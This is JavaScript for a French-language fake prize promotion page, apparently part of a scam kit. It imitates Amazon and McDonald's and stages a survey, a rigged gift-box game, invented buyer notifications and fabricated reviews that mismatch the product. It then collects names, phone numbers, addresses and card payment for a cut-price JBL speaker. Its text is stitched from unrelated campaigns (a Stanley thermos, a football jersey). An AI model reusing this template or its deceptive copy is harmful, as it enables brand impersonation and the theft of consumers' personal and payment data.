const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

const siteKey = "JBLGO3-fr";

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "Cette semaine, vous ne pouvez passer une commande au prix promotionnel qu'une seule fois.",
    text: `
  Félicitations!<br><br>
  Vous avez participé à la promotion Stanley : vous avez la chance d'acheter la thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b> !
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Paris, France",
      action: "Je viens de recevoir le bijou pour 9,99 euro !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Carlos B******",
      location: "Marseille, France",
      action: "Je viens de recevoir le bijou pour 9,99 euro !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Louloute",
      time: "Il y a un jour",
      header: "Cette litière est vraiment incroyable.",
      image: "./src/img/review_1.jpg",
      review: `Elle est top! Le plus c est la qualité du son le petit format très pratique la marque et le prix merci Amazon`,
    },
    {
      name: "JEAN MARC",
      time: "Il y a deux jours",
      header: "C'est la meilleure litière à ma connaissance.",
      image: "./src/img/review_2.jpg",
      review: "Son très bon, design parfait, fonctionnalités simples. Les basses sont bien présentes et la longévité de la batterie est conforme à la description. Le rapport qualité/prix est parfait donc je recommande.",
    },
    {
      name: "Brice",
      time: "Il y a deux jours",
      header: "Simplement incroyable.",
      image: "./src/img/review_3.jpg",
      review: "Enceinte très pratique par sa petite taille avec un excellent son et un beau design !",
    },
    {
      name: "Yoann",
      time: "Il y a quatre jours",
      header: "J'aime ça",
      image: "./src/img/review_4.jpg",
      review: "Bien reçu marche très bien rien a dire 😎👍",
    },
    {
      name: "Benoit M",
      time: "Il y a sept jours",
      header: "Wow, j'adore ce produit !",
      image: "./src/img/review_5.jpg",
      review: "Cette enceinte a un rapport qualité prix exceptionnel. En effet a se prix là,rien de comparable de disponible sur le marché. La marque n'a plus rien à prouver, le son est d'excellente qualité pour une enceinte de ce gabarit, elle est étanche et la batterie tient plusieurs heures.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "ÉVALUATIONS ET AVIS",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} sur {2} :",
    arr: [
      {
        q: "Avez-vous déjà commandé des produits McDonald's ?",
        a: [
          "Oui, je commande souvent",
          "Oui, je commande rarement",
          "Je n'ai jamais commandé",
        ],
      },
      {
        q: "McDonald's devrait-il continuer ce type de campagnes publicitaires ?",
        a: ["Oui, bien sûr !", "Oui, mais changez le menu promotionnel", "Non"],
      },
      {
        q: "Recommanderiez-vous nos produits à vos amis ?",
        a: ["Oui", "Non"],
      },
    ],
  };

  const check = {
    title: "Votre réponse est en cours d'évaluation",
    arr: [
      "Vous avez répondu à la question 3 sur 3",
      "Votre adresse IP ne montre aucune commande précédente",
      "Votre réponse a été vérifiée",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Merci d'avoir participé au sondage !",
        button: "Essayez votre chance",
        text: `
      <center>
      Pour obtenir le menu promotionnel de McDonald's, vous devez choisir la bonne boîte-cadeau.
      <br><br>
      Vous avez 3 tentatives, bonne chance !
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "Réessayer",
        text: `
      <center>
      Malheureusement, cette boîte-cadeau est vide. Il vous reste deux tentatives, bonne chance !
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Maillot Domicile de l'Équipe de France (Hommes) 2024/25",
        button: "Obtenez le coupon",
        text: `
      <center>
      <p style="color: #ffffff"></p>
      <br>
      Cliquez sur "Obtenez le coupon", remplissez le formulaire et payez la commande.
      <br><br>
      Recevez un SMS avec le coupon et des instructions pour l'activer.
      <br><br>
      Le coupon peut être activé à tout moment et ne nécessite aucun paiement supplémentaire.
      </center>
    `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Modes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la commande",
      oldPrice: "33,99 €",
      newPrice: "9,99 €",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "9,99 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "9,99 €",
      },
      checkoutButton: "Payer votre commande",
    },
  };

  const products = [
    {
      id: "26468784",
      name: "JBL GO 3",
      miniImg: "./src/img/price-jblgo3.png",
      images: ["./src/img/price-jblgo3.png"],
    },
  ];

  const footer = {
    cr: "© 2024 Amazon. Tous droits réservés.",
  };


  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});


function setCookie(name, value, days = 30) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});